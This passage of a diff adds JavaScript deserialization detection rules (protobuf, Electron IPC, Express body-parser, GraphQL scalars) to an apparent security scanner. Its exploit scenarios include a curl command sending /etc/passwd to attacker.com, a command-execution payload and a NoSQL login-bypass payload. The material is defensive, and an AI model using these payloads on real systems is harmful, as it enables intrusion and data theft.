+        A real-time collaboration service uses WebSocket with MessagePack
+        serialization for binary efficiency. The server uses msgpack-lite
+        with a custom codec that includes extension types for Date and
+        RegExp objects. An attacker crafts a MessagePack binary payload
+        with a malicious extension type that triggers a custom decode
+        handler, injecting unexpected object types into the application
+        state. This causes type confusion in the document merge logic,
+        allowing the attacker to overwrite other users' documents.
+      example_payload: "\\x82\\xa4type\\xa7command\\xa4data\\xc7\\x0f\\x01{malicious_ext_payload}"
+      attacker_objective: "Inject arbitrary objects through MessagePack extension types to manipulate application state"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-005"
+        - "DESER-JS-001"
+
+  # ============================================================================
+  # DESER-JS-005: FlatBuffers / Protocol Buffers Schema Bypass
+  # ============================================================================
+  - rule_id: "DESER-JS-005"
+    title: "FlatBuffers or Protocol Buffers Schema Bypass via Untrusted Deserialization"
+    description: >
+      Detects scenarios where FlatBuffers or Protocol Buffers deserialization
+      is performed on untrusted input without proper schema validation or
+      where schema enforcement can be bypassed. While protobuf and flatbuffers
+      are schema-based formats that provide some inherent safety, misuse such
+      as using Any types, dynamic message parsing, unknown field forwarding,
+      or accepting arbitrary bytes fields can lead to type confusion, schema
+      bypass, and in some cases injection attacks through improperly validated
+      nested messages or oneof fields.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.80
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - protobuf
+      - flatbuffers
+      - schema-bypass
+      - type-confusion
+      - binary-protocol
+      - grpc
+    detection_layer: 3
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '\.deserializeBinary\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|buffer|message)'
+        description: "Protocol Buffers deserializeBinary on untrusted input"
+      - type: regex
+        pattern: 'protobuf\.Root\.fromJSON\s*\([^)]*\)\.lookupType\s*\([^)]*\)\.decode\s*\('
+        description: "Dynamic protobuf schema loading and message decoding"
+      - type: regex
+        pattern: 'google\.protobuf\.Any'
+        description: "Usage of protobuf Any type allowing arbitrary message types"
+      - type: regex
+        pattern: 'flatbuffers\.ByteBuffer\s*\(\s*new\s+Uint8Array\s*\(\s*(req\.|data|body|buffer|payload)'
+        description: "FlatBuffers ByteBuffer from untrusted input"
+      - type: regex
+        pattern: 'proto\.decode\s*\(\s*(req\.|data|body|buffer|payload|message)'
+        description: "protobufjs decode on user-controlled data"
+      - type: regex
+        pattern: 'getRootAs\w+\s*\(\s*new\s+flatbuffers\.ByteBuffer'
+        description: "FlatBuffers root object access from untrusted buffer"
+      - type: regex
+        pattern: 'Message\.decode\s*\(\s*Buffer\.from\s*\('
+        description: "Protobuf message decode from buffer conversion"
+      - type: regex
+        pattern: 'grpc\.(deserialize|decode)\s*\(\s*(data|buffer|payload|message)'
+        description: "gRPC deserialization of untrusted data"
+    anti_patterns:
+      - '\.decode\s*\(\s*\w+\.encode\s*\('
+      - '\.deserializeBinary\s*\(\s*\w+\.serializeBinary'
+      - '\/\/\s*test'
+      - '\.decode\s*\(\s*internal'
+      - '\.decode\s*\(\s*config\.'
+      - 'mock.*protobuf'
+      - '\.decode\s*\(\s*fixture'
+      - '\.decode\s*\(\s*trusted'
+      - '\.decode\s*\(\s*verified'
+      - '\.decode\s*\(\s*signed'
+      - 'schema\.validate.*decode'
+      - '\.decode\s*\(\s*sample'
+      - '\.decode\s*\(\s*expected'
+      - '\.decode\s*\(\s*known'
+    bypass_variants:
+      - description: "Using protobuf Any type to embed arbitrary message types"
+        pattern: '\.unpack\s*\(\s*google\.protobuf\.Any'
+      - description: "Dynamic schema loading from untrusted source"
+        pattern: 'protobuf\.load\s*\(\s*(req\.|data|url|path|config)\s*[,)]'
+      - description: "Unknown field preservation allowing schema bypass"
+        pattern: 'preserveUnknownFields\s*:\s*true|unknownFields\s*:\s*true'
+    evasion_indicators:
+      - "Dynamic .proto file loading from user-controlled path"
+      - "Any type wrapping to bypass expected message schema"
+      - "Unknown field forwarding passing unvalidated data to downstream services"
+      - "Bytes field containing nested serialized messages"
+      - "Oneof field type confusion"
+    encoding_variants:
+      - type: "base64_protobuf"
+        pattern: 'decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
+      - type: "hex_protobuf"
+        pattern: 'decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)'
+      - type: "json_to_protobuf"
+        pattern: '(fromObject|fromJSON)\s*\(\s*JSON\.parse'
+    multi_function_chain_patterns:
+      - "gRPC request -> deserialize -> Any.unpack -> business logic"
+      - "WebSocket binary -> protobuf.decode -> database operation"
+      - "HTTP body -> flatbuffers.ByteBuffer -> data processing"
+      - "Message queue -> protobuf decode -> microservice forwarding"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Schema bypass via Any types or unknown fields can lead to processing unexpected message types that bypass authorization checks in service mesh"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "gRPC client request"
+        sink: "protobuf Message.decode"
+        through: "gRPC server handler"
+      - source: "HTTP request body"
+        sink: "flatbuffers.ByteBuffer"
+        through: "Custom binary body parser"
+      - source: "Kafka message"
+        sink: "protobuf decode"
+        through: "Consumer deserialization"
+    impact: |
+      Protobuf/FlatBuffers schema bypass can lead to:
+      - Type confusion causing incorrect business logic execution
+      - Authorization bypass via unexpected message types through Any fields
+      - Data corruption through malformed nested messages
+      - Denial of Service via deeply nested or recursive message structures
+      - Information leakage through unknown field forwarding
+    remediation: |
+      1. Avoid using google.protobuf.Any in public-facing APIs:
+         ```protobuf
+         // Bad: allows any message type
+         message Request { google.protobuf.Any payload = 1; }
+         // Good: use specific message types
+         message Request { UserPayload payload = 1; }
+         ```
+      2. Disable unknown field preservation:
+         ```javascript
+         const options = { defaults: true, oneofs: true, unknownFields: false };
+         const msg = MessageType.decode(buffer).toJSON(options);
+         ```
+      3. Validate decoded messages against business logic constraints.
+      4. Implement message size limits at the transport layer.
+      5. Use gRPC interceptors for input validation before handler execution.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://protobuf.dev/programming-guides/proto3/"
+      - "https://google.github.io/flatbuffers/"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "protobuf or flatbuffers import in same file"
+        - "gRPC service handler"
+        - "Any type usage in proto definition"
+        - "No message validation after decode"
+      taint_source_indicators:
+        - "gRPC request"
+        - "WebSocket binary data"
+        - "HTTP binary body"
+        - "Message queue payload"
+        - "RPC call arguments"
+      taint_sink_indicators:
+        - "Message.decode"
+        - "deserializeBinary"
+        - "flatbuffers.ByteBuffer"
+        - "Any.unpack"
+        - "proto.decode"
+      sanitization_patterns:
+        - "Message field validation after decode"
+        - "Type assertion on decoded message"
+        - "Schema version checking"
+        - "Message size limit enforcement"
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (any_type_used ? 1.3 : 0.9)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A microservice architecture uses gRPC with Protocol Buffers for
+        inter-service communication. The user-facing API gateway accepts
+        protobuf-encoded requests and forwards them to backend services.
+        A message definition uses google.protobuf.Any for a flexible payload
+        field. An attacker crafts a request that wraps an AdminCommand message
+        type inside the Any field, which the backend service unpacks and
+        processes without verifying the caller's authorization level. This
+        allows the attacker to execute administrative operations.
+      example_payload: "type.googleapis.com/internal.AdminCommand with embedded delete_all_users command"
+      attacker_objective: "Bypass schema-level authorization by embedding unexpected message types in Any fields"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-004"
+        - "DESER-JS-008"
+
+  # ============================================================================
+  # DESER-JS-006: Electron IPC Deserialization
+  # ============================================================================
+  - rule_id: "DESER-JS-006"
+    title: "Electron IPC Deserialization Leading to Main Process Compromise"
+    description: >
+      Detects unsafe deserialization patterns in Electron IPC (Inter-Process
+      Communication) channels where data from renderer processes (which may
+      be compromised via XSS or malicious web content) is deserialized or
+      processed by the main process without validation. Electron's structured
+      clone algorithm for IPC can transfer complex objects including Buffers,
+      TypedArrays, and in some configurations, prototypes. A compromised
+      renderer can send crafted IPC messages to exploit deserialization
+      in the main process, gaining access to Node.js APIs and the file system.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.88
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - electron
+      - ipc
+      - main-process
+      - renderer
+      - sandbox-escape
+      - desktop
+    detection_layer: 2
+    attack_surface_type: "internal"
+    patterns:
+      - type: regex
+        pattern: 'ipcMain\.on\s*\(\s*["\x27][^"]*["\x27]\s*,\s*(async\s+)?\(\s*event\s*,\s*\w+'
+        description: "ipcMain.on handler receiving data from renderer process"
+      - type: regex
+        pattern: 'ipcMain\.handle\s*\(\s*["\x27][^"]*["\x27]\s*,\s*(async\s+)?\(\s*event\s*,\s*\w+'
+        description: "ipcMain.handle processing incoming IPC invocations"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*arg|JSON\.parse\s*\(\s*data|JSON\.parse\s*\(\s*message'
+        description: "JSON.parse on IPC arguments in main process handler"
+      - type: regex
+        pattern: 'eval\s*\(\s*(arg|data|message|payload)'
+        description: "eval on IPC data in main process - critical RCE"
+      - type: regex
+        pattern: 'child_process\.\w+\s*\([^)]*\b(arg|data|message|payload)\b'
+        description: "child_process execution with IPC argument data"
+      - type: regex
+        pattern: 'require\s*\(\s*(arg|data|message|payload)'
+        description: "Dynamic require with IPC-received module path"
+      - type: regex
+        pattern: 'ipcMain\.(on|handle)\s*\([^)]+\)\s*[^{]*\{\s*[^}]*fs\.(read|write|unlink|mkdir)'
+        description: "File system operations within IPC handler using received data"
+      - type: regex
+        pattern: 'contextBridge\.exposeInMainWorld\s*\([^)]*,\s*\{[^}]*(exec|spawn|eval)'
+        description: "contextBridge exposing dangerous APIs to renderer"
+    anti_patterns:
+      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*validate'
+      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*sanitize'
+      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*schema'
+      - 'nodeIntegration\s*:\s*false'
+      - 'contextIsolation\s*:\s*true'
+      - 'sandbox\s*:\s*true'
+      - '\/\/\s*test'
+      - 'mock.*ipcMain'
+      - 'jest\.mock.*electron'
+      - 'typeof\s+arg\s*[!=]==\s*["\x27]string["\x27]'
+      - 'ipcMain\.(on|handle).*whitelist'
+      - 'ipcMain\.(on|handle).*allowlist'
+      - 'webContents\.session\.setPermission'
+    bypass_variants:
+      - description: "Using webContents.send to trigger main process handler from compromised renderer"
+        pattern: 'webContents\.send\s*\(\s*["\x27][^"]*["\x27]\s*,\s*\{'
+      - description: "Remote module access from renderer to main process"
+        pattern: 'enableRemoteModule\s*:\s*true|require\s*\(\s*["\x27]@electron/remote["\x27]\s*\)'
+      - description: "Preload script exposing Node.js APIs without context isolation"
+        pattern: 'contextIsolation\s*:\s*false.*preload'
+    evasion_indicators:
+      - "Renderer compromise via XSS sending crafted IPC messages"
+      - "Remote module enabled allowing direct main process object access"
+      - "Context isolation disabled enabling prototype pollution across contexts"
+      - "Custom protocol handler deserialization"
+      - "Deep link handler processing serialized data"
+    encoding_variants:
+      - type: "base64_ipc"
+        pattern: 'Buffer\.from\s*\(\s*(arg|data|message)\s*,\s*["\x27]base64["\x27]\s*\)'
+      - type: "json_ipc"
+        pattern: 'JSON\.parse\s*\(\s*(arg|data|message|payload)\s*\)'
+      - type: "structured_clone"
+        pattern: 'structuredClone\s*\(\s*(arg|data|message)\s*\)'
+    multi_function_chain_patterns:
+      - "XSS in renderer -> ipcRenderer.send -> ipcMain.on -> exec"
+      - "Deep link -> app.on('open-url') -> deserialization -> file access"
+      - "Custom protocol -> protocol.handle -> parse -> Node.js API"
+      - "Renderer -> ipcRenderer.invoke -> ipcMain.handle -> database query"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Compromised renderer process can escalate to full Node.js access in main process via unsafe IPC deserialization, escaping the browser sandbox"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "ipcRenderer.send / ipcRenderer.invoke arguments"
+        sink: "ipcMain.on / ipcMain.handle callback"
+        through: "Electron IPC channel"
+      - source: "webContents.executeJavaScript return value"
+        sink: "Main process handler"
+        through: "IPC return channel"
+      - source: "Deep link URL parameters"
+        sink: "Main process URL handler"
+        through: "app.on('open-url') event"
+    impact: |
+      Unsafe Electron IPC deserialization can result in:
+      - Full main process compromise from renderer sandbox escape
+      - Arbitrary file system read/write access
+      - Native code execution via child_process
+      - Credential theft from system keychain
+      - Privilege escalation to operating system level
+      - Installation of persistent backdoors
+    remediation: |
+      1. Enable context isolation and disable node integration:
+         ```javascript
+         new BrowserWindow({
+           webPreferences: {
+             nodeIntegration: false,
+             contextIsolation: true,
+             sandbox: true,
+             preload: path.join(__dirname, 'preload.js')
+           }
+         });
+         ```
+      2. Validate all IPC inputs in main process handlers:
+         ```javascript
+         ipcMain.handle('save-file', async (event, data) => {
+           if (typeof data.path !== 'string' || !isAllowedPath(data.path)) {
+             throw new Error('Invalid path');
+           }
+           if (typeof data.content !== 'string' || data.content.length > MAX_SIZE) {
+             throw new Error('Invalid content');
+           }
+           // Process validated data
+         });
+         ```
+      3. Use contextBridge to expose only specific, validated API methods.
+      4. Verify sender identity in IPC handlers using event.senderFrame.url.
+      5. Remove @electron/remote and enableRemoteModule usage.
+    references:
+      - "https://www.electronjs.org/docs/latest/tutorial/security"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://blog.doyensec.com/2022/09/27/electron-context-isolation.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - "ipcMain handler in Electron main process file"
+        - "No input validation in handler body"
+        - "File system or child_process usage in handler"
+        - "contextIsolation disabled in BrowserWindow config"
+      taint_source_indicators:
+        - "ipcMain.on callback arguments"
+        - "ipcMain.handle callback arguments"
+        - "app.on('open-url') URL parameter"
+        - "Custom protocol handler data"
+      taint_sink_indicators:
+        - "child_process.exec"
+        - "fs.writeFileSync"
+        - "eval"
+        - "require (dynamic)"
+        - "shell.openExternal"
+        - "dialog.showSaveDialog"
+      sanitization_patterns:
+        - "Type checking on IPC arguments"
+        - "Path validation with path.normalize and allowlist"
+        - "Input length limits"
+        - "event.senderFrame.url verification"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (context_isolation_disabled ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An Electron application has contextIsolation disabled and processes
+        IPC messages in the main process. A cross-site scripting vulnerability
+        in the renderer process allows an attacker to inject JavaScript that
+        sends crafted IPC messages:
+        require('electron').ipcRenderer.send('execute-command', {
+          cmd: 'curl attacker.com/steal?data=' + require('fs').readFileSync('/etc/passwd')
+        });
+        The main process IPC handler passes the cmd property to
+        child_process.exec without validation, resulting in arbitrary
+        command execution with the application's system privileges.
+      example_payload: "ipcRenderer.send('exec', {cmd: 'id > /tmp/pwned'})"
+      attacker_objective: "Escape renderer sandbox via IPC deserialization to achieve full system access through the main process"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-001"
+        - "DESER-JS-002"
+
+  # ============================================================================
+  # DESER-JS-007: Express body-parser Type Confusion
+  # ============================================================================
+  - rule_id: "DESER-JS-007"
+    title: "Express body-parser Type Confusion via Content-Type Manipulation"
+    description: >
+      Detects misconfigurations in Express.js body-parser middleware that
+      allow type confusion attacks. When body-parser is configured to handle
+      multiple content types without strict type checking, an attacker can
+      send a request with a manipulated Content-Type header to have the body
+      parsed differently than expected. This can lead to prototype pollution
+      when the JSON parser processes a body the application expects to be
+      URL-encoded, or bypass input validation when an object structure is
+      injected where a flat key-value pair was expected.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.85
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - express
+      - body-parser
+      - type-confusion
+      - content-type
+      - middleware
+      - node
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.json\s*\(\s*\{[^}]*type\s*:\s*["\x27]\*'
+        description: "body-parser JSON middleware accepting all content types"
+      - type: regex
+        pattern: 'express\.json\s*\(\s*\{[^}]*strict\s*:\s*false'
+        description: "Express JSON parser with strict mode disabled allowing primitives"
+      - type: regex
+        pattern: 'bodyParser\.(json|urlencoded|raw|text)\s*\(\s*\{[^}]*type\s*:\s*["\x27]\*\/\*["\x27]'
+        description: "body-parser accepting wildcard content type"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.json\s*\(\s*\)\s*\)\s*;\s*app\.use\s*\(\s*bodyParser\.urlencoded'
+        description: "Both JSON and URL-encoded parsers enabled without type restriction"
+      - type: regex
+        pattern: 'bodyParser\.json\s*\(\s*\{[^}]*reviver\s*:'
+        description: "Custom JSON reviver function that may introduce unsafe transformations"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*express\.json\s*\(\s*\{[^}]*type\s*:\s*function'
+        description: "Custom type detection function for JSON parsing"
+      - type: regex
+        pattern: 'bodyParser\.raw\s*\(\s*\{[^}]*type\s*:\s*["\x27]application\/json["\x27]'
+        description: "Raw parser configured for JSON type leading to manual parsing"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*req\.body\s*\).*bodyParser\.text'
+        description: "Manual JSON.parse on text-parsed body without type safety"
+    anti_patterns:
+      - 'bodyParser\.json\s*\(\s*\{[^}]*type\s*:\s*["\x27]application\/json["\x27]'
+      - 'express\.json\s*\(\s*\{[^}]*strict\s*:\s*true'
+      - 'bodyParser\.json\s*\(\s*\{[^}]*type\s*:\s*["\x27]application\/[^*]'
+      - '\/\/\s*test'
+      - 'app\.use\s*\(\s*bodyParser\.json\s*\(\s*\)\s*\)\s*$'
+      - 'helmet\s*\(\s*\)'
+      - 'express-validator'
+      - 'joi\.validate'
+      - 'celebrate\s*\('
+      - 'ajv\.validate'
+      - 'zod\.parse'
+      - 'yup\.validate'
+      - 'class-validator'
+      - 'content-type.*check'
+      - 'req\.is\s*\(\s*["\x27]json["\x27]\s*\)'
+    bypass_variants:
+      - description: "Send JSON body with application/x-www-form-urlencoded Content-Type"
+        pattern: 'Content-Type\s*:\s*application\/x-www-form-urlencoded.*\{"__proto__"'
+      - description: "Use charset parameter to influence parsing behavior"
+        pattern: 'Content-Type\s*:.*charset\s*=\s*(utf-7|utf7|unicode-1-1-utf-7)'
+      - description: "Exploit body-parser limit difference between parsers"
+        pattern: 'bodyParser\.json\s*\(\s*\{[^}]*limit\s*:\s*["\x27]\d+mb["\x27].*bodyParser\.urlencoded\s*\(\s*\{[^}]*limit\s*:\s*["\x27]\d+kb["\x27]'
+    evasion_indicators:
+      - "Content-Type header manipulation to force different parser"
+      - "Charset encoding tricks to bypass JSON validation"
+      - "Multiple body-parser instances with overlapping type handling"
+      - "Custom type function with permissive matching"
+      - "Transfer-Encoding chunked with mixed content types"
+    encoding_variants:
+      - type: "charset_confusion"
+        pattern: 'Content-Type\s*:.*charset\s*=\s*(utf-7|utf-16|utf-32)'
+      - type: "multipart_bypass"
+        pattern: 'Content-Type\s*:\s*multipart\/form-data.*boundary'
+      - type: "content_type_params"
+        pattern: 'Content-Type\s*:\s*application\/json\s*;\s*\w+='
+    multi_function_chain_patterns:
+      - "Content-Type manipulation -> JSON parser -> prototype pollution -> auth bypass"
+      - "URL-encoded body -> JSON reparse -> type confusion -> SQL injection"
+      - "Raw body -> manual parse -> missing validation -> business logic bypass"
+      - "Text body -> JSON.parse -> schema bypass -> data corruption"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Type confusion through Content-Type manipulation can bypass input validation to inject object structures where scalar values are expected"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request with manipulated Content-Type"
+        sink: "body-parser middleware"
+        through: "Express middleware chain"
+      - source: "JSON body with form Content-Type"
+        sink: "URL-encoded parser -> req.body"
+        through: "Content-Type mismatch"
+      - source: "Nested object in URL-encoded body"
+        sink: "Application logic expecting flat object"
+        through: "qs parser extended mode"
+    impact: |
+      Body-parser type confusion can lead to:
+      - Prototype pollution through Content-Type manipulation
+      - Input validation bypass via unexpected object structures
+      - SQL injection through type confusion in query builders
+      - Authentication bypass by injecting object where string expected
+      - Mass assignment vulnerabilities through nested object injection
+    remediation: |
+      1. Explicitly set content type for each parser:
+         ```javascript
+         app.use(express.json({ type: 'application/json', strict: true }));
+         app.use(express.urlencoded({ extended: false, type: 'application/x-www-form-urlencoded' }));
+         ```
+      2. Validate Content-Type in route handlers:
+         ```javascript
+         app.post('/api/data', (req, res) => {
+           if (!req.is('application/json')) {
+             return res.status(415).json({ error: 'Unsupported Media Type' });
+           }
+           // Process request
+         });
+         ```
+      3. Use schema validation (Joi, Zod, Ajv) on parsed body.
+      4. Disable extended URL-encoded parsing: `extended: false`.
+      5. Set appropriate body size limits per parser.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://expressjs.com/en/resources/middleware/body-parser.html"
+      - "https://github.com/expressjs/body-parser/issues/347"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Multiple body-parser middleware registrations"
+        - "No Content-Type validation in route handlers"
+        - "Wildcard or function-based type configuration"
+        - "Missing input schema validation"
+      taint_source_indicators:
+        - "req.body"
+        - "req.query"
+        - "Content-Type header"
+        - "req.headers['content-type']"
+      taint_sink_indicators:
+        - "Database query with req.body values"
+        - "Object.assign with req.body"
+        - "Spread operator on req.body"
+        - "Direct property access on req.body without type check"
+      sanitization_patterns:
+        - "req.is('json') check"
+        - "Schema validation with Joi/Zod/Ajv"
+        - "Type checking on req.body properties"
+        - "express-validator middleware"
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (wildcard_type ? 1.3 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An Express application uses both bodyParser.json() and
+        bodyParser.urlencoded({ extended: true }) without restricting
+        content types. A login endpoint expects URL-encoded username and
+        password fields. An attacker sends a request with Content-Type:
+        application/json and body {"username": {"$gt": ""}, "password":
+        {"$gt": ""}}. The JSON parser processes this into objects instead
+        of strings. When these objects are passed to a MongoDB query, they
+        become NoSQL injection operators, bypassing authentication.
+      example_payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+      attacker_objective: "Exploit type confusion between parsers to inject object structures that bypass input validation"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-001"
+        - "DESER-JS-008"
+
+  # ============================================================================
+  # DESER-JS-008: GraphQL Custom Scalar Deserialization
+  # ============================================================================
+  - rule_id: "DESER-JS-008"
+    title: "GraphQL Custom Scalar Deserialization Enabling Injection Attacks"
+    description: >
+      Detects unsafe custom scalar type implementations in GraphQL schemas
+      where the parseValue or parseLiteral functions deserialize user input
+      without proper validation. Custom scalars in GraphQL (such as JSON,
+      DateTime, Upload, or custom domain types) use parseValue to process
+      variable values and parseLiteral to process inline values. If these
+      functions perform unsafe operations like JSON.parse without schema
+      validation, eval, or dynamic type instantiation, an attacker can
+      inject malicious payloads through GraphQL variables or inline values.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.82
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - graphql
+      - custom-scalar
+      - type-coercion
+      - injection
+      - schema
+      - api
+    detection_layer: 3
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'new\s+GraphQLScalarType\s*\(\s*\{[^}]*parseValue\s*:'
+        description: "Custom GraphQL scalar type with parseValue implementation"
+      - type: regex
+        pattern: 'parseValue\s*:\s*\(?[^)]*\)?\s*=>\s*JSON\.parse\s*\('
+        description: "parseValue using JSON.parse on user input"
+      - type: regex
+        pattern: 'parseLiteral\s*:\s*\(?[^)]*\)?\s*=>\s*(eval|Function)\s*\('
+        description: "parseLiteral using eval or Function constructor"
+      - type: regex
+        pattern: 'parseValue\s*:\s*\(?[^)]*\)?\s*=>\s*\w+\.deserialize\s*\('
+        description: "parseValue delegating to a deserialization function"
+      - type: regex
+        pattern: 'GraphQLJSON|graphql-type-json'
+        description: "Usage of GraphQL JSON scalar type allowing arbitrary JSON"
+      - type: regex
+        pattern: 'parseValue\s*:\s*\(?[^)]*\)?\s*=>\s*yaml\.load\s*\('
+        description: "parseValue using yaml.load on variable input"
+      - type: regex
+        pattern: 'parseValue\s*:\s*\(?[^)]*\)?\s*=>\s*new\s+\w+\s*\('
+        description: "parseValue constructing objects from user-controlled input"
+      - type: regex
+        pattern: 'parseLiteral\s*:\s*(function|.+=>\s*)\s*\{[^}]*JSON\.parse\s*\('
+        description: "parseLiteral performing JSON.parse on AST value"
+    anti_patterns:
+      - 'parseValue\s*:.*typeof\s+\w+\s*[!=]==\s*["\x27]string["\x27]'
+      - 'parseValue\s*:.*validate\s*\('
+      - 'parseValue\s*:.*schema\.'
+      - 'parseValue\s*:.*Number\s*\('
+      - 'parseValue\s*:.*parseInt\s*\('
+      - 'parseValue\s*:.*new\s+Date\s*\('
+      - 'parseValue\s*:.*moment\s*\('
+      - '\/\/\s*test'
+      - 'parseValue\s*:.*sanitize'
+      - 'parseValue\s*:.*isValid'
+      - 'parseValue\s*:.*assert'
+      - 'parseLiteral\s*:.*Kind\.(INT|FLOAT|STRING|BOOLEAN)'
+      - 'graphql-scalars'
+    bypass_variants:
+      - description: "JSON scalar allowing prototype pollution via GraphQL variables"
+        pattern: 'GraphQLJSON.*parseValue\s*:\s*\(?value\)?\s*=>\s*value'
+      - description: "Custom scalar with permissive parseLiteral accepting any AST node"
+        pattern: 'parseLiteral\s*:\s*\(?ast\)?\s*=>\s*ast\.value'
+      - description: "Scalar coercion chain through multiple custom types"
+        pattern: 'serialize\s*:\s*\(?[^)]*\)?\s*=>\s*[^,}]+,\s*parseValue\s*:\s*\(?[^)]*\)?\s*=>\s*JSON\.parse'
+    evasion_indicators:
+      - "Custom scalar accepting arbitrary JSON objects as values"
+      - "parseLiteral accepting ObjectValue AST nodes without field validation"
+      - "Scalar type used in mutation input without deeper validation"
+      - "Custom directive modifying scalar coercion behavior"
+    encoding_variants:
+      - type: "graphql_variable"
+        pattern: 'variables\s*:\s*\{[^}]*"\w+"\s*:\s*\{.*__proto__'
+      - type: "inline_value"
+        pattern: 'mutation\s*\{[^}]*\(\s*input\s*:\s*\{.*__proto__'
+      - type: "base64_in_scalar"
+        pattern: 'parseValue\s*:.*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
+    multi_function_chain_patterns:
+      - "GraphQL query -> custom scalar parseValue -> JSON.parse -> prototype pollution"
+      - "Mutation variable -> scalar coercion -> object construction -> database insert"
+      - "Subscription payload -> scalar deserialization -> event processing"
+      - "Federation subgraph -> custom scalar -> cross-service type confusion"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Custom scalar deserialization can inject malicious objects into GraphQL resolver context, bypassing field-level authorization directives"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "GraphQL query variables"
+        sink: "Custom scalar parseValue function"
+        through: "GraphQL execution engine type coercion"
+      - source: "GraphQL mutation inline arguments"
+        sink: "Custom scalar parseLiteral function"
+        through: "AST value extraction"
+      - source: "GraphQL subscription payload"
+        sink: "Custom scalar serialize function"
+        through: "PubSub message deserialization"
+    impact: |
+      Unsafe GraphQL scalar deserialization can lead to:
+      - Prototype pollution through JSON scalar types accepting arbitrary objects
+      - Injection attacks via unvalidated scalar values reaching resolvers
+      - Type confusion in downstream data processing
